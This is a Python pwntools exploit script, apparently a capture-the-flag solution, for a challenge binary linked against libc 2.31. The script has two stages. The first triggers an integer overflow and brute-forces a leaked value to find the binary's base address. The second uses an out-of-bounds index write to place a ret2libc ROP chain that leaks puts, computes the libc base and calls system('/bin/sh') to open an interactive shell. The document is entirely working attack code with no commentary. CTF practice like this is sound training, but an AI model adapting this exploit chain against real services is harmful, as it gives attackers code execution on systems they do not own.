#!/usr/bin/env python3

from pwn import *
import struct

exe = ELF("./chall_patched", checksec=False)
libc = ELF("./libc-2.31.so", checksec=False)
ld = ELF("./ld-2.31.so", checksec=False)

context.binary = exe
context.log_level = 'debug'

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r

def input_data(price, quantity):
    p.sendlineafter(b'Price: $', f'{price}'.encode())
    p.sendlineafter(b'Quantity: ', f'{quantity}'.encode())

def modify(index, value):
    p.sendlineafter(b'Index to modify (-1 to quit): ', f'{index}'.encode())
    price = u64(value) & 0xffffffff
    quantity = u64(value) >> 32
    input_data(price, quantity)

def BruteforceAddr(result):
    # Bruteforce 2 first bytes of result
    for twobytes in range(0x1111, 0xffff):
        # Bruteforce the division
        for divisor in range(0x5555, 0x56ff):
            # We want to conserve the number
            tmp = result | (twobytes << 32)

            # Take the integer and the mod (Ex: 1234.3)
            division = str(tmp / divisor).split('.')

            # Compare if the mod is null --> integer number
            if division[1] == '0':
                # Compare last 5 number
                if hex(int(division[0]))[-5:] == '00b6c':
                    # If correct, just get it
                    return (divisor << 32) | int(division[0])

p = conn()

################################
### Stage 1: Get exe address ###
################################
p.sendlineafter(b'Number of items: ', b'0x2000000000000000')
result = int(p.recvline()[:-1].split(b': $')[1])
result = u32(struct.pack('<i', result))
print("[+] Result: " + hex(result))
addr = BruteforceAddr(result)
print("[+] Leak address: " + hex(addr))
exe.address = addr - 0xb6c
print("[+] Exe base: " + hex(exe.address))

#################################
### Stage 2: Conduct ret2libc ###
#################################
p.sendlineafter(b'[1=Yes]', b'1')
pop_rdi = 0x0000000000000d53
payload = p64(exe.address + pop_rdi)
payload += p64(exe.got['puts'])
payload += p64(exe.plt['puts'])
payload += p64(exe.sym['main'])
for i in range(int(len(payload) / 8)):
    modify(i+11, payload[i*8:i*8+8])
p.sendlineafter(b'Index to modify (-1 to quit): ', b'-1')

# Get libc address
p.recvline()
p.recvline()
puts_addr = u64(p.recvline()[:-1] + b'\x00\x00')
print("[+] Puts address: " + hex(puts_addr))
libc.address = puts_addr - libc.sym['puts']
print("[+] Libc base: " + hex(libc.address))

# Spawn shell
p.sendlineafter(b'Number of items: ', b'0x2000000000000000')
p.sendlineafter(b'[1=Yes]', b'1')
pop_rsi_r15 = 0x0000000000000d51
payload = flat(
    exe.address + pop_rdi,
    next(libc.search(b'/bin/sh')),
    exe.address + pop_rsi_r15,
    0,
    0,
    libc.sym['system'])
for i in range(int(len(payload) / 8)):
    modify(i+11, payload[i*8:i*8+8])
p.sendlineafter(b'Index to modify (-1 to quit): ', b'-1')

p.interactive()